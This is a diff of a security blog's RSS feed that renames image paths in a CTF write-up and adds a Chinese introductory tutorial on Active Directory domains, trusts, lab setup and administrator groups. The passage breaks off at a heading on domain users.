-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -179,10 +1059,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;扫描到登录界面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png&#34;
 	width=&#34;532&#34;
 	height=&#34;480&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -257,10 +1137,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;到处点一点拿到flag2&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png&#34;
 	width=&#34;852&#34;
 	height=&#34;336&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -283,10 +1163,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;进行连接登录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png&#34;
 	width=&#34;720&#34;
 	height=&#34;190&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -444,431 +1324,571 @@ If you enjoyed this CTF, send me a tweet via @DCAU7.&lt;/p&gt;
 </description>
         </item>
         <item>
+        <title>域</title>
+        <link>https://dxlaboratory.github.io/p/test-chinese/</link>
+        <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://dxlaboratory.github.io/p/test-chinese/</guid>
+        <description>&lt;p&gt;+++&lt;/p&gt;
+&lt;h4 id=&#34;域介绍&#34;&gt;域介绍
+&lt;/h4&gt;&lt;h5 id=&#34;什么是域&#34;&gt;什么是域
+&lt;/h5&gt;&lt;p&gt;它是一个有安全边界的计算机集合，一个域中的用户无法访问另一个域中的资源。用户想要进入域和进入域内后想要访问什么资源也要有对应的权限
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230004919.png&#34;
+	width=&#34;1008&#34;
+	height=&#34;375&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230004919_hu2058729316143551820.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230004919_hu10851564931915001587.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230004919&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;268&#34;
+		data-flex-basis=&#34;645px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;工作组就相当于在大学，域相当于在高中，工作组可以随机进入，没有统一管理用户。域不可以随意进入，并且存在统一管理用户
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230014356.png&#34;
+	width=&#34;1012&#34;
+	height=&#34;430&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230014356_hu5895055432159851483.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230014356_hu13474538388785004099.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230014356&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;235&#34;
+		data-flex-basis=&#34;564px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;单域和多域&#34;&gt;单域和多域
+&lt;/h5&gt;&lt;p&gt;在一个域内，一般至少要用两台域服务器，一台作为DC，一台作为备份DC
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230024928.png&#34;
+	width=&#34;1012&#34;
+	height=&#34;498&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230024928_hu4603765982461503469.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230024928_hu9335165716908657089.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230024928&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;
+在多个域中，需要每个域都有自己的DC
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230035993.png&#34;
+	width=&#34;1009&#34;
+	height=&#34;724&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230035993_hu10305703898917627968.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230035993_hu13162477012507652314.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230035993&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;139&#34;
+		data-flex-basis=&#34;334px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;父域和子域&#34;&gt;父域和子域
+&lt;/h5&gt;&lt;p&gt;一般来说在多个域中，第一个域称为父域，各分部的域称为该域的子域
+域名一般为xxx.xxx。而子域的为xxx.xxx.xx.例：父域为：abc.com,那么子域一般为sec.abc.com,yunwei.abc.com这种&lt;/p&gt;
+&lt;h5 id=&#34;域树和域森林&#34;&gt;域树和域森林
+&lt;/h5&gt;&lt;h6 id=&#34;域树&#34;&gt;域树
+&lt;/h6&gt;&lt;p&gt;域树是多个域通过建立信任关系组合的继集成。两个域之间想要互相访问需要建立信任关系。
+（或者说由一个父域和多个子域组成的关系组叫做域树）
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230056489.png&#34;
+	width=&#34;1013&#34;
+	height=&#34;495&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230056489_hu1281380786261922879.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230056489_hu505892576423765871.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230056489&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;204&#34;
+		data-flex-basis=&#34;491px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;域森林&#34;&gt;域森林
+&lt;/h6&gt;&lt;p&gt;多个域树通过建立信任关系组合成的集合。
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230232021.png&#34;
+	width=&#34;1014&#34;
+	height=&#34;538&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230232021_hu15766742695333057516.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230232021_hu11793734157342799525.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230232021&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;188&#34;
+		data-flex-basis=&#34;452px&#34;
+	
+&gt;
+比如说一家公司兼并了另一家公司，自家公司的域树为abc.com,兼并的公司域树为abc.net，那么abc.net无法挂在域abc.com下。那么它们两个就需要建立信任关系达到链接的目的。&lt;/p&gt;
+&lt;h6 id=&#34;dc域控&#34;&gt;DC域控
+&lt;/h6&gt;&lt;p&gt;一般来说，一个域里面至少要有两台域服务器，一个DC（域控服务器），一个备份DC
+![image-20241104230120068](三、域.assets/image-20241104230120068.png&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230241906.png&#34;
+	width=&#34;883&#34;
+	height=&#34;618&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230241906_hu12451678834308265854.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230241906_hu11486064157033723080.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230241906&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;342px&#34;
+	
+&gt;
+一般来说， 进入域环境中优先拿下DC服务器。&lt;/p&gt;
+&lt;h6 id=&#34;域环境搭建&#34;&gt;域环境搭建
+&lt;/h6&gt;&lt;ol&gt;
+&lt;li&gt;搭建域的网络环境&lt;/li&gt;
+&lt;li&gt;DC机器搭建&lt;/li&gt;
+&lt;li&gt;域内主机搭建&lt;/li&gt;
+&lt;li&gt;加入域和退出域&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;准备一台DC虚拟机，两台正常用户机
+在vm虚拟机上设置DC的IP（192.168.41.0）网关（192.168.41.2）并且设置net模式。
+vm配置
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230313308.png&#34;
+	width=&#34;1006&#34;
+	height=&#34;875&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230313308_hu5122531976855993818.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230313308_hu6675607220764557474.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230313308&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;114&#34;
+		data-flex-basis=&#34;275px&#34;
+	
+&gt;
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230323835.png&#34;
+	width=&#34;1007&#34;
+	height=&#34;918&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230323835_hu12348525019891251919.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230323835_hu473248453888359821.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230323835&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;
+DC本机配置
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230334021.png&#34;
+	width=&#34;1008&#34;
+	height=&#34;1024&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230334021_hu2814761957728520573.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230334021_hu16736853261129760585.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230334021&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;98&#34;
+		data-flex-basis=&#34;236px&#34;
+	
+&gt;
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230347165.png&#34;
+	width=&#34;1016&#34;
+	height=&#34;833&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230347165_hu172029425482292920.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230347165_hu12898056020863827454.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230347165&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;121&#34;
+		data-flex-basis=&#34;292px&#34;
+	
+&gt;
+在服务器管理器内&amp;mdash;-&amp;gt; 添加角色和功能&amp;mdash;-&amp;gt;前面三个默认，服务器角色选择域服务与DNS服务&amp;mdash;-&amp;gt;剩余全部下一步（如果密码过于简单，在安装过程中可能会报错）
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230419629.png&#34;
+	width=&#34;1010&#34;
+	height=&#34;714&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230419629_hu12819833228918969557.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230419629_hu7165135424639075932.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230419629&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;141&#34;
+		data-flex-basis=&#34;339px&#34;
+	
+&gt;
+将DC升级为域控制服务器。(设置密码，域名称等)
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230429313.png&#34;
+	width=&#34;1003&#34;
+	height=&#34;609&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230429313_hu8189685808167542291.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230429313_hu9894551442144633343.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230429313&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;164&#34;
+		data-flex-basis=&#34;395px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;域内主机搭建&#34;&gt;域内主机搭建
+&lt;/h6&gt;&lt;p&gt;windows7
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230445998.png&#34;
+	width=&#34;659&#34;
+	height=&#34;715&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230445998_hu5784769464885963496.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230445998_hu11123868945199883274.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230445998&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;92&#34;
+		data-flex-basis=&#34;221px&#34;
+	
+&gt;搭建成功的话可以ping的通
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230455619.png&#34;
+	width=&#34;959&#34;
+	height=&#34;418&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230455619_hu133515987475427370.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230455619_hu8939624616468818182.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230455619&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;229&#34;
+		data-flex-basis=&#34;550px&#34;
+	
+&gt;
+加入和退出域
+在vm内，域内主机都要设置为net模式
+加入域
+管理工具 &amp;mdash;-&amp;gt; AD用户和计算机
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230504829.png&#34;
+	width=&#34;1006&#34;
+	height=&#34;742&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230504829_hu13558041965408351784.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230504829_hu10060367614239704066.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230504829&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;135&#34;
+		data-flex-basis=&#34;325px&#34;
+	
+&gt;
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230512618.png&#34;
+	width=&#34;1007&#34;
+	height=&#34;696&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230512618_hu1723184680307362466.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230512618_hu5986208632533487212.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230512618&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;347px&#34;
+	
+&gt;
+添加了一个域用户，在另一台还未加入域环境的主机，加入域环境
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230525091.png&#34;
+	width=&#34;1012&#34;
+	height=&#34;698&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230525091_hu4386369867213110233.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230525091_hu10862441980005373463.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230525091&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;347px&#34;
+	
+&gt;
+返回域内机器，设置&amp;mdash;&amp;gt;关于&amp;mdash;-&amp;gt;重命名此电脑&amp;mdash;&amp;gt;更改
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230538709.png&#34;
+	width=&#34;1014&#34;
+	height=&#34;736&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230538709_hu6708021092672011886.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230538709_hu15598936562574140431.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230538709&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;330px&#34;
+	
+&gt;
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230550035.png&#34;
+	width=&#34;695&#34;
+	height=&#34;835&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230550035_hu3869424436288057664.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230550035_hu12306650159114007571.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230550035&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;83&#34;
+		data-flex-basis=&#34;199px&#34;
+	
+&gt;
+退出域将隶属于改为工作组就可以了（需要提供域管理员的用户名和密码)&lt;/p&gt;
+&lt;h4 id=&#34;域信任关系&#34;&gt;域信任关系
+&lt;/h4&gt;&lt;h4 id=&#34;什么是信任关系&#34;&gt;什么是信任关系
+&lt;/h4&gt;&lt;p&gt;域就像一个边界，域内的用户账户只能在域本域内使用，而信任关系就像是在两个域之间搭建一座桥，让域用户可以跨域使用
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230704454.png&#34;
+	width=&#34;1051&#34;
+	height=&#34;418&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230704454_hu11865668908156750333.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230704454_hu11215095389321550393.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230704454&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;251&#34;
+		data-flex-basis=&#34;603px&#34;
+	
+&gt;
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230712630.png&#34;
+	width=&#34;1062&#34;
+	height=&#34;817&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230712630_hu4142214386640440989.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230712630_hu9515011924502186793.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230712630&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;129&#34;
+		data-flex-basis=&#34;311px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;内外部信任关系&#34;&gt;内外部信任关系
+&lt;/h4&gt;&lt;h5 id=&#34;内部信任&#34;&gt;内部信任
+&lt;/h5&gt;&lt;p&gt;内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;在域树中的所有域都是双向信任关系，在创建一个新的子域时，系统会在新的子域和父域之间自动创建双向信任关系。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230802851.png&#34;
+	width=&#34;1036&#34;
+	height=&#34;780&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230802851_hu1499386912983484323.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230802851_hu4748220833374945771.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230802851&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;132&#34;
+		data-flex-basis=&#34;318px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;外部信任关系&#34;&gt;&lt;strong&gt;外部信任关系&lt;/strong&gt;
+&lt;/h5&gt;&lt;p&gt;外部信任关系是指不同域之间的信任关系，这种一般是单向或双向不可传递的
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241105085604139.png&#34;
+	width=&#34;1260&#34;
+	height=&#34;565&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241105085604139_hu13564142330379077676.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241105085604139_hu15357168423443965815.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241105085604139&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;223&#34;
+		data-flex-basis=&#34;535px&#34;
+	
+&gt;
+A域与B域之间建立外部信任关系，但是A域没有与B域的子域不存在信任关系。&lt;/p&gt;
+&lt;h4 id=&#34;域内用户&#34;&gt;域内用户
+&lt;/h4&gt;&lt;h4 id=&#34;域内用户组介绍&#34;&gt;域内用户组介绍
+&lt;/h4&gt;&lt;p&gt;电脑加入到域，使用域内的用户进行登录。域内存用户的信息放在域控（DC）上， 添加用户或修改密码都在域控上执行。
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230818989.png&#34;
+	width=&#34;1017&#34;
+	height=&#34;586&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230818989_hu14683152367306681328.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230818989_hu11052859578206117654.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230818989&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;416px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;domain-admins组&#34;&gt;Domain Admins组
+&lt;/h6&gt;&lt;p&gt;在域控主机中的Domain Admins（域管理员组）中的用户，拥有完整的管理员权限。该组内的所有用户都会添加到每台域成员的Domain Admins中。这样就可以获取域中所有计算机的所有权
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230828963.png&#34;
+	width=&#34;903&#34;
+	height=&#34;553&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230828963_hu12124609352260938371.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230828963_hu4083573219465214334.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230828963&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;391px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;administrators组&#34;&gt;Administrators组
+&lt;/h6&gt;&lt;p&gt;如果添加到位置是在域控的Administrators组中，那么添加的账号只是域控这台主机的管理员权限，并不是所有域成员机器的管理员权限。
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230838100.png&#34;
+	width=&#34;906&#34;
+	height=&#34;691&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230838100_hu14305372676259537440.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230838100_hu1028161646783038708.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230838100&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;131&#34;
+		data-flex-basis=&#34;314px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;enterprise-admins组&#34;&gt;Enterprise Admins组
+&lt;/h6&gt;&lt;p&gt;Enterprise Admins（企业系统管理员组）是域森林或根域中的一个组。这个组在域森林中的每个域内都是Administrators组的成员。对所有==域控制器都要完全访问权限==
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230847156.png&#34;
+	width=&#34;1014&#34;
+	height=&#34;223&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230847156_hu5663005707482081703.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230847156_hu1458773367403066704.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230847156&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;454&#34;
+		data-flex-basis=&#34;1091px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;domain-users组&#34;&gt;Domain users组
